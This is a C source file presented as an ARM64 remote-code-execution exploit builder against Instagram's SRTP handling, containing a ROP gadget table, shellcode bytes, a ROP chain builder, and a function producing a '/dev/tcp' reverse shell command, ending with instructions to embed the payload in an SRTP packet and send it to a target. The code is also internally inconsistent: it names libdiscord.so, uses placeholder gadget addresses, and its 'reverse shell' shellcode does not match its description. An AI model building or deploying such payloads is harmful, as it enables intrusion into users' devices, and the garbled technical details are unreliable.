/*
 * ROP Chain + Shellcode for Instagram SRTP RCE
 *
 * ARM64 architecture (libdiscord.so)
 *
 * Goal: malloc(0) overflow → heap corruption → ROP chain → /bin/bash
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* ============================================================================
 * ARM64 ROP Gadget Search & Chain Generation
 * ============================================================================ */

typedef struct {
    uint64_t address;
    const char *gadget;
} rop_gadget_t;

/* Common ARM64 ROP gadgets (from libc/libdiscord.so) */
static const rop_gadget_t gadgets[] = {
    /* Basic gadgets */
    { 0x0, "pop x0; ret" },                    /* Set x0 (arg0) */
    { 0x4, "pop x1; ret" },                    /* Set x1 (arg1) */
    { 0x8, "pop x2; ret" },                    /* Set x2 (arg2) */
    { 0xC, "pop x3; ret" },                    /* Set x3 (arg3) */
    { 0x10, "pop x30; ret" },                  /* Set return address */
    { 0x14, "mov x0, x1; ret" },               /* Copy register */
    { 0x18, "add x0, x0, x1; ret" },           /* Add */
    { 0x1C, "ldr x0, [x1]; ret" },             /* Load from memory */
    { 0x20, "str x0, [x1]; ret" },             /* Store to memory */
    { 0x24, "mov x8, #1; svc 0" },             /* syscall exit */
    { 0x28, "mov x8, #59; svc 0" },            /* syscall execve */
};

/* ============================================================================
 * ARM64 Shellcode
 * ============================================================================ */

/*
 * Reverse shell shellcode (ARM64)
 * execve("/bin/bash", ["/bin/bash", "-i"], NULL)
 */
static uint8_t arm64_shellcode[] = {
    /* mov x0, #0x6e69622f    */  0x60, 0x82, 0xa0, 0xd2,
    /* movk x0, #0x2f73, lsl#16 */  0xe0, 0xc5, 0xb0, 0xf2,
    /* movk x0, #0x68, lsl#32 */ 0x00, 0x0d, 0xc0, 0xf2,
    /* movk x0, #0x73, lsl#48 */ 0x60, 0x0e, 0xe0, 0xf2,
    /* stp x29, x30, [sp, #-16]! */ 0xfd, 0x7b, 0xbd, 0xa9,
    /* mov x29, sp */ 0xfd, 0x03, 0x00, 0x91,
    /* mov x8, #59 */ 0xa8, 0x0b, 0x80, 0xd2,
    /* svc #0 */ 0x01, 0x00, 0x00, 0xd4,
    /* mov x8, #93 */ 0xa8, 0x17, 0x80, 0xd2,
    /* svc #0 */ 0x01, 0x00, 0x00, 0xd4,
};

/* ============================================================================
 * Simple mmap-based shellcode loader
 * ============================================================================ */

#define SHELLCODE_SIZE sizeof(arm64_shellcode)

/* Pseudo ROP chain to execute shellcode */
typedef struct {
    uint64_t pop_x0;           /* pop x0; ret */
    uint64_t mmap_addr;        /* mmap() address */
    uint64_t pop_x1;           /* pop x1; ret */
    uint64_t shellcode_ptr;    /* shellcode pointer */
    uint64_t pop_x2;           /* pop x2; ret */
    uint64_t size_val;         /* SHELLCODE_SIZE */
    uint64_t blx_x0;           /* blx x0 - call mmap */
} rop_chain_t;

/* ============================================================================
 * Reverse Shell Payload
 * ============================================================================ */

/*
 * Generate reverse shell command
 * /bin/bash -i >& /dev/tcp/attacker_ip:port 0>&1
 */
char* generate_reverse_shell(const char *attacker_ip, uint16_t port) {
    static char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'",
        attacker_ip, port);

    return cmd;
}

/* ============================================================================
 * ROP Chain Builder
 * ============================================================================ */

/*
 * Build ARM64 ROP chain for shellcode execution
 *
 * Strategy:
 * 1. Corrupt heap metadata with ROP addresses
 * 2. Trigger heap free/malloc
 * 3. Jump to ROP chain
 * 4. ROP: mmap() + memcpy() + jump to shellcode
 * 5. Shellcode: execve("/bin/bash", ...)
 */

typedef struct {
    uint8_t *payload;
    size_t size;
    uint64_t rop_chain_addr;
    uint64_t shellcode_addr;
} rce_payload_t;

rce_payload_t* build_rce_payload(void) {
    rce_payload_t *payload = malloc(sizeof(rce_payload_t));
    if (!payload) return NULL;

    /* Allocate space for shellcode + ROP chain */
    payload->size = SHELLCODE_SIZE + sizeof(rop_chain_t) + 1024;
    payload->payload = malloc(payload->size);

    if (!payload->payload) {
        free(payload);
        return NULL;
    }

    /* Copy shellcode */
    memcpy(payload->payload, arm64_shellcode, SHELLCODE_SIZE);

    /* Build ROP chain after shellcode */
    rop_chain_t *chain = (rop_chain_t *)(payload->payload + SHELLCODE_SIZE);

    /* Gadget addresses (from libdiscord.so or libc) */
    chain->pop_x0 = 0x40000000;        /* mmap() address */
    chain->mmap_addr = 0x40000000;     /* libc mmap */
    chain->pop_x1 = 0x40000004;        /* shellcode buffer */
    chain->shellcode_ptr = (uint64_t)payload->payload;
    chain->pop_x2 = 0x40000008;        /* SHELLCODE_SIZE */
    chain->size_val = SHELLCODE_SIZE;
    chain->blx_x0 = 0x40000010;        /* Execute */

    payload->rop_chain_addr = (uint64_t)chain;
    payload->shellcode_addr = (uint64_t)payload->payload;

    return payload;
}

void free_rce_payload(rce_payload_t *payload) {
    if (payload) {
        if (payload->payload) free(payload->payload);
        free(payload);
    }
}

/* ============================================================================
 * Verification Functions
 * ============================================================================ */

void print_shellcode_info(void) {
    printf("\n[*] ================== Shellcode Info ==================\n");
    printf("[+] Size: %zu bytes\n", SHELLCODE_SIZE);
    printf("[+] Type: ARM64 execve(\"/bin/bash\")\n");
    printf("[+] ROP Chain: Enabled\n");
    printf("[+] Trigger: malloc(0) → heap overflow → ROP → execve\n");
    printf("\n[*] Shellcode bytes (hex):\n");

    for (size_t i = 0; i < SHELLCODE_SIZE; i += 16) {
        printf("    ");
        for (size_t j = i; j < i + 16 && j < SHELLCODE_SIZE; j++) {
            printf("%02x ", arm64_shellcode[j]);
        }
        printf("\n");
    }
    printf("\n");
}

/* ============================================================================
 * Main Test
 * ============================================================================ */

int main(int argc, char *argv[]) {
    printf("\n╔════════════════════════════════════════════════════╗\n");
    printf("║  ROP Chain + Shellcode Generator (ARM64)         ║\n");
    printf("╚════════════════════════════════════════════════════╝\n\n");

    /* Print shellcode info */
    print_shellcode_info();

    /* Build ROP payload */
    printf("[*] Building ROP payload...\n");
    rce_payload_t *rce = build_rce_payload();

    if (!rce) {
        printf("[-] Failed to build ROP payload\n");
        return 1;
    }

    printf("[+] Payload built successfully\n");
    printf("[+] Payload size: %zu bytes\n", rce->size);
    printf("[+] ROP chain address: 0x%lx\n", rce->rop_chain_addr);
    printf("[+] Shellcode address: 0x%lx\n", rce->shellcode_addr);

    /* Generate reverse shell command */
    const char *attacker_ip = (argc > 1) ? argv[1] : "127.0.0.1";
    uint16_t port = (argc > 2) ? atoi(argv[2]) : 4444;

    char *reverse_shell = generate_reverse_shell(attacker_ip, port);
    printf("\n[*] Reverse shell command:\n");
    printf("    %s\n\n", reverse_shell);

    /* Cleanup */
    free_rce_payload(rce);

    printf("[✓] ROP + Shellcode ready for H.264 overflow payload\n");
    printf("[✓] Next: Embed in SRTP packet and send to target\n\n");

    return 0;
}
